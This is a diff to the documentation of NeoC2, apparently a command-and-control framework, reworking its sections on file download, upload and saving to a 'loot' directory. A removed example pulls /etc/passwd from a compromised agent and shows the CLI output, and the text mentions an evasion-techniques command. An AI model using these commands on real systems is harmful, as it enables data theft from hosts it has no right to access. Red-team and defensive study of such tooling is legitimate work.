@@ -220,46 +220,28 @@ evasion list                  # List available evasion techniques
 
 NeoC2 provides enhanced file operations with automatic handling of encoded content.
 
-### Download Command
+### File Download 
+- **Base64 Encoding**: Files are automatically base64-encoded during transfer 
+- **Command Format**: `download <remote_path>` - queues download task for the agent
+- **Automatic Decoding**: CLI automatically detects and decodes base64 content for storage
+- **Smart Saving**: Files saved to loot directory with timestamps and sanitized names
+- **Remote CLI**: Download an agent executable or script from C2 Server to your local remote_client machine.
 
-The enhanced `download` command automatically:
-- Creates 'loot' directory if it doesn't exist
-- Detects base64-encoded content
-- Decodes base64 content automatically
-- Saves files with meaningful names and timestamps
-- Reports file sizes
+### File Upload 
+- **Base64 Encoding**: Local files are base64-encoded before transmission to agent
+- **Command Format**: `upload <remote_path> <base64_data>` - agent receives and decodes the file
+- **CLI Integration**: Use the `upload` command to send files to agents
 
-Usage:
+**Example Usage**:
 ```
-download <agent_id> <remote_path>
-```
+# Download a file from the agent
+download <agent_id> <remote_file_path>
 
-Example:
-```
-NeoC2 > download abc12345 /etc/passwd
-[+] Download task queued (Task ID: 123) for '/etc/passwd' from agent abc123...
-[+] Created loot directory: loot
-[+] File downloaded and saved to: loot/20251008_120000_passwd
-[+] Size: 1542 bytes
-```
+# Download a file from the C2 Server
+download <file_path_on_c2>
 
-### Save Command
-
-The `save` command allows manual saving of specific task results:
-- Supports both base64-encoded and plain text results
-- Offers custom filename option
-- Integrates with loot directory system
-
-Usage:
-```
-save <agent_id> <task_id> [filename]
-```
-
-Example:
-```
-NeoC2 > save abc12345 task765 mystuff.txt
-[+] File (base64 decoded) saved to: loot/mystuff.txt
-[+] Size: 2048 bytes
+# Upload a file to the agent
+upload <agent_id> <local_file_path> <remote_file_path>
 ```
 
 ### Result Command
@@ -556,32 +538,6 @@ listener create <listener_name> https <port> <ip> profile_name=<profile_name>
 3. The agent currently handles UTC properly, but other timezones are primarily handled as local time.
 4. Days are numbered from 1-7 (Monday=1, Sunday=7), with Sunday represented as both 0 (Go's default) and 7 (in configuration).
 5. Hours are specified in 24-hour format (0-23).
-
-### File Operation Commands
-
-### File Download 
-- **Base64 Encoding**: Files are automatically base64-encoded during transfer 
-- **Command Format**: `download <remote_path>` - queues download task for the agent
-- **Automatic Decoding**: CLI automatically detects and decodes base64 content for storage
-- **Smart Saving**: Files saved to loot directory with timestamps and sanitized names
-- **Remote CLI**: Download an agent executable or script from C2 Server to your local remote_client machine.
-
-### File Upload 
-- **Base64 Encoding**: Local files are base64-encoded before transmission to agent
-- **Command Format**: `upload <remote_path> <base64_data>` - agent receives and decodes the file
-- **CLI Integration**: Use the `upload` command to send files to agents
-
-**Example Usage**:
-```
-# Download a file from the agent
-download <agent_id> <remote_file_path>
-
-# Download a file from the C2 Server
-download <file_path_on_c2>
-
-# Upload a file to the agent
-upload <agent_id> <local_file_path> <remote_file_path>
-```
 
 ## Event Monitoring
 
